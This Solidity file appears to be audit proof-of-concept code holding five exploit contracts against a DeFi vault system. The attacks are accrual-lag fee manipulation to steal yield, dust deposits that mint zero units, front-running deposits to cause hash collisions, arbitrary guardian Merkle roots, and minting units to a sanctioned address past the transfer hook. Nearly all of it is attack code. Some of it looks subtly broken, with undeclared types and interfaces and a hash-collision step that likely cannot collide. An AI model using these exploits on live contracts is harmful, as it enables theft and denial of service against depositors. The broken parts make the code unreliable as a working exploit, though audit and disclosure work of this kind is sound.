// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import { IERC20 } from "@oz/token/ERC20/IERC20.sol";
import { IPriceAndFeeCalculator } from "./PriceAndFeeCalculator/src/core/interfaces/IPriceAndFeeCalculator.sol";
import { IProvisioner } from "./Provisioner/src/core/interfaces/IProvisioner.sol";
import { IMultiDepositorVault } from "./MultiDepositorVault/src/core/interfaces/IMultiDepositorVault.sol";

/**
 * @title Exploit #1: Accrual Lag Manipulation
 * @notice Exploits the accrual lag mechanism to manipulate fee calculations
 * @dev Critical vulnerability allowing theft of unclaimed yield
 */
contract AccrualLagExploit {
    IPriceAndFeeCalculator public immutable priceCalculator;
    address public immutable vault;
    address public immutable attacker;
    
    constructor(IPriceAndFeeCalculator _priceCalculator, address _vault) {
        priceCalculator = _priceCalculator;
        vault = _vault;
        attacker = msg.sender;
    }
    
    /**
     * @notice Execute the accrual lag manipulation attack
     * @dev Requires attacker to be vault accountant or have authority
     */
    function exploit() external {
        // Step 1: Get current price state
        (VaultPriceState memory state,) = priceCalculator.getVaultState(vault);
        uint128 currentPrice = state.unitPrice;
        uint32 currentTimestamp = state.timestamp;
        
        // Step 2: Submit price update that triggers pause
        // Use price outside tolerance to force pause
        uint128 manipulatedPrice = uint128(
            (uint256(currentPrice) * state.maxPriceToleranceRatio + 1) / 10000
        );
        
        // This will pause the vault and set accrualLag
        priceCalculator.setUnitPrice(vault, manipulatedPrice, uint32(block.timestamp));
        
        // Step 3: Wait for significant time to pass
        // In real attack, wait days/weeks for lag to accumulate
        // vm.warp(block.timestamp + 30 days);
        
        // Step 4: Unpause with original price/timestamp
        // This triggers _accrueFees with accumulated lag
        priceCalculator.unpauseVault(vault, currentPrice, currentTimestamp);
        
        // Result: Fees accrued for entire pause period despite no actual price change
        // Performance fees calculated on artificial gains from highestPrice update
    }
}

/**
 * @title Exploit #2: Precision Loss Attack
 * @notice Exploits rounding errors in multiplier calculations
 * @dev Medium severity - can lock tokens with no units minted
 */
contract PrecisionLossExploit {
    IProvisioner public immutable provisioner;
    IERC20 public immutable token;
    
    constructor(IProvisioner _provisioner, IERC20 _token) {
        provisioner = _provisioner;
        token = _token;
    }
    
    /**
     * @notice Exploit precision loss in token to units conversion
     * @dev Deposits tokens but receives 0 units due to rounding
     */
    function exploit() external {
        // Assume depositMultiplier is set to 9000 (90%)
        // With small token amounts, multiplication then division causes truncation
        
        // Step 1: Approve minimal token amount
        uint256 dustAmount = 1; // 1 wei of token
        token.approve(address(provisioner), dustAmount);
        
        // Step 2: Attempt deposit with dust amount
        // tokensAdjusted = 1 * 9000 / 10000 = 0 (truncated)
        // Results in 0 units minted
        provisioner.deposit(token, dustAmount, 0);
        
        // Result: Token transferred to vault but no units minted
        // Funds effectively locked/lost
    }
}

/**
 * @title Exploit #3: Deposit Hash Collision  
 * @notice Front-runs deposits to cause hash collisions
 * @dev Medium severity - DoS attack on deposits
 */
contract HashCollisionExploit {
    IProvisioner public immutable provisioner;
    
    constructor(IProvisioner _provisioner) {
        provisioner = _provisioner;
    }
    
    /**
     * @notice Front-run a user's deposit to cause hash collision
     * @param victim Address of the victim attempting deposit
     * @param token Token being deposited
     * @param tokenAmount Amount of tokens
     * @param unitsAmount Expected units output
     */
    function exploit(
        address victim,
        IERC20 token,
        uint256 tokenAmount,
        uint256 unitsAmount
    ) external {
        // Calculate the refundableUntil timestamp
        // This is predictable: block.timestamp + depositRefundTimeout
        (, uint256 timeout) = provisioner.depositDetails();
        uint256 refundableUntil = block.timestamp + timeout;
        
        // Generate same hash as victim's upcoming deposit
        bytes32 targetHash = provisioner.getDepositHash(
            victim,
            token,
            tokenAmount,
            unitsAmount,
            refundableUntil
        );
        
        // Front-run with identical parameters to occupy the hash
        // This will cause victim's deposit to revert with HashCollision error
        token.approve(address(provisioner), tokenAmount);
        provisioner.deposit(token, tokenAmount, unitsAmount);
        
        // Result: Victim's deposit fails, funds potentially locked in contract
    }
}

/**
 * @title Exploit #4: Unchecked Guardian Root
 * @notice Demonstrates setting arbitrary merkle roots
 * @dev Medium severity - requires compromised owner
 */
contract GuardianRootExploit {
    address public immutable vault;
    
    constructor(address _vault) {
        vault = _vault;
    }
    
    /**
     * @notice Set malicious merkle root for guardian
     * @dev Requires owner access to vault
     */
    function exploit() external {
        // Generate arbitrary root without validation
        bytes32 maliciousRoot = keccak256(abi.encode("MALICIOUS"));
        
        // Set root for attacker-controlled guardian
        IBaseVault(vault).setGuardianRoot(msg.sender, maliciousRoot);
        
        // Guardian can now submit operations with crafted proofs
        // No validation that root corresponds to legitimate operations
        
        // Result: Guardian can potentially execute unauthorized operations
    }
}

/**
 * @title Exploit #5: Transfer Hook Bypass
 * @notice Demonstrates sanctioned address receiving units via mint
 * @dev Low severity - design limitation
 */
contract TransferHookBypass {
    IProvisioner public immutable provisioner;
    address public immutable sanctionedAddress;
    
    constructor(IProvisioner _provisioner, address _sanctioned) {
        provisioner = _provisioner;
        sanctionedAddress = _sanctioned;
    }
    
    /**
     * @notice Sanctioned address receives units through deposit
     * @dev Hook only checks transfers, not mints
     */
    function exploit(IERC20 token, uint256 amount) external {
        // Sanctioned address approves tokens
        // In practice, sanctioned address would execute this
        token.approve(address(provisioner), amount);
        
        // Deposit mints units directly to sanctioned address
        // No beforeTransfer hook called for mint (from = address(0))
        provisioner.deposit(token, amount, 1);
        
        // Result: Sanctioned address receives vault units despite blacklist
    }
}